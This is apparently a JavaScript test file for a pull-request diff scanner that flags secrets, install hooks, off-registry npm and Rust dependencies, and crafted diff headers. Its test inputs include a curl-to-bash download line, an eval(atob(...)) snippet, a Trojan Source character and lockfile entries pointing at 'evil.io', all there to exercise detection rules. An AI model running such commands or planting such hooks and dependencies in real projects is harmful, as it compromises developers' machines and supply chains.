import { test } from 'node:test'
import assert from 'node:assert/strict'
import { scan } from './pr-guard.mjs'

const diff = (file, ...added) =>
  `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n@@ -1,0 +10,${added.length} @@\n` +
  added.map(l => '+' + l).join('\n')

const names = d => scan(d).map(f => `${f.level}:${f.name}`)

test('código normal passa limpo', () => {
  assert.deepEqual(scan(diff('src/App.tsx', 'const x = 1', 'export default x')), [])
})

test('bloqueia segredos e payloads', () => {
  assert.ok(names(diff('src/a.ts', 'const k = "AKIA' + 'ABCDEFGHIJKLMNOP"')).includes('block:Token AWS'))
  assert.ok(names(diff('src/a.ts', 'ev' + 'al(at' + 'ob("ZG9jdW1lbnQ="))')).includes('block:Código decodificado executado'))
  assert.ok(names(diff('x.sh', 'curl -s http://x.io/a | ' + 'bash')).includes('block:Download executado no shell'))
  assert.ok(names(diff('src/a.ts', 'if (isAdmin\u202E) {')).some(n => n.includes('Trojan')))
})

test('regras por arquivo só valem no arquivo certo', () => {
  assert.ok(names(diff('package.json', '"postinstall": "node x.js",')).includes('block:Hook de instalação npm'))
  assert.ok(!names(diff('src/a.ts', '"postinstall": "node x.js",')).includes('block:Hook de instalação npm'))
  assert.ok(names(diff('package-lock.json', '"resolved": "https://evil.io/x.tgz",')).includes('block:Pacote baixado fora do registry npm'))
  assert.ok(!names(diff('package-lock.json', '"resolved": "https://registry.npmjs.org/x/-/x.tgz",')).some(n => n.startsWith('block')))
})

test('regras de Rust', () => {
  assert.ok(names(diff('build.rs', 'fn main() {}')).includes('block:build.rs do Cargo (executa código ao compilar)'))
  assert.ok(names(diff('Cargo.toml', 'x = { git = "https://evil.io/x" }')).includes('block:Dependência Rust fora do crates.io'))
  assert.ok(!names(diff('Cargo.toml', 'axum = "0.8"')).some(n => n.startsWith('block')))
  assert.ok(names(diff('Cargo.lock', 'source = "git+https://evil.io/x"')).includes('block:Crate baixado fora do crates.io'))
  assert.ok(!names(diff('Cargo.lock', 'source = "registry+https://github.com/rust-lang/crates.io-index"')).some(n => n.startsWith('block')))
  assert.ok(names(diff('src/main.rs', 'Command::new("sh")')).includes('warn:Executa processo externo (Rust)'))
})

test('linha adicionada "++ x" não troca o arquivo atual', () => {
  const r = scan(diff('package.json', '++ fake', '"postinstall": "x",'))
  assert.ok(r.some(f => f.name === 'Hook de instalação npm' && f.file === 'package.json'))
})

test('par removido/adicionado com cara de cabeçalho não troca o arquivo', () => {
  const crafted = [
    'diff --git a/Cargo.toml b/Cargo.toml',
    '--- a/Cargo.toml',
    '+++ b/Cargo.toml',
    '@@ -1,2 +1,3 @@',
    '--- b/src/benign.rs',
    '+++ b/src/benign.rs',
    '+dependency = { git = "https://example.invalid/repo" }',
  ].join('\n')
  const findings = scan(crafted)
  assert.ok(findings.some(f => f.level === 'block' && f.file === 'Cargo.toml' && f.name === 'Dependência Rust fora do crates.io'))
})

test('aponta a linha correta', () => {
  const [f] = scan(diff('src/a.ts', 'ok', 'const t = "ghp_' + 'a'.repeat(36) + '"'))
  assert.equal(f.line, 11)
})

test('mexer em .github gera aviso, não bloqueio', () => {
  const r = scan(diff('.github/workflows/x.yml', 'on: push'))
  assert.ok(r.length && r.every(f => f.level === 'warn'))
})

test('renomear um arquivo existente para build.rs é bloqueado', () => {
  const renamed = [
    'diff --git a/tools/gen.rs b/build.rs',
    'similarity index 100%',
    'rename from tools/gen.rs',
    'rename to build.rs',
  ].join('\n')
  assert.ok(names(renamed).includes('block:build.rs do Cargo (executa código ao compilar)'))
  const config = renamed.replaceAll('build.rs', '.cargo/config.toml')
  assert.ok(names(config).includes('block:Configuração do Cargo alterada (registry/fonte)'))
  const harmless = renamed.replaceAll('build.rs', 'src/gen.rs')
  assert.deepEqual(scan(harmless), [])
})

test('caminho entre aspas (acento) ainda cai nas regras por arquivo', () => {
  const quoted = [
    'diff --git "a/\\303\\251/package.json" "b/\\303\\251/package.json"',
    '--- /dev/null',
    '+++ "b/\\303\\251/package.json"',
    '@@ -0,0 +1 @@',
    '+"postinstall": "node x.js",',
  ].join('\n')
  const findings = scan(quoted)
  assert.ok(findings.some(f => f.name === 'Hook de instalação npm' && f.file === 'é/package.json'))
})

test('formas alternativas de chave no Cargo.toml', () => {
  const block = line => names(diff('Cargo.toml', line)).filter(n => n.startsWith('block'))
  assert.ok(block('package.build = "x.rs"').includes('block:Build script declarado no Cargo.toml'))
  assert.ok(block('"build" = "x.rs"').includes('block:Build script declarado no Cargo.toml'))
  assert.ok(block('x = { "git" = "https://evil.io/x" }').includes('block:Dependência Rust fora do crates.io'))
  assert.ok(block('x.git = "https://evil.io/x"').includes('block:Dependência Rust fora do crates.io'))
  assert.ok(block('[patch.crates-io]').some(n => n.includes('[patch]')))
  assert.ok(block('[replace]').some(n => n.includes('[patch]')))
  assert.ok(names(diff('Cargo.toml', 'evil = { path = "../evil" }')).some(n => n.startsWith('warn:Caminho local')))
  // Linhas legítimas deste repositório continuam passando sem bloqueio.
  for (const line of ['hyper = { version = "1", features = ["http1", "server"] }', 'publish = false', 'edition = "2021"', 'digit = "1"'])
    assert.deepEqual(block(line), [], line)
})
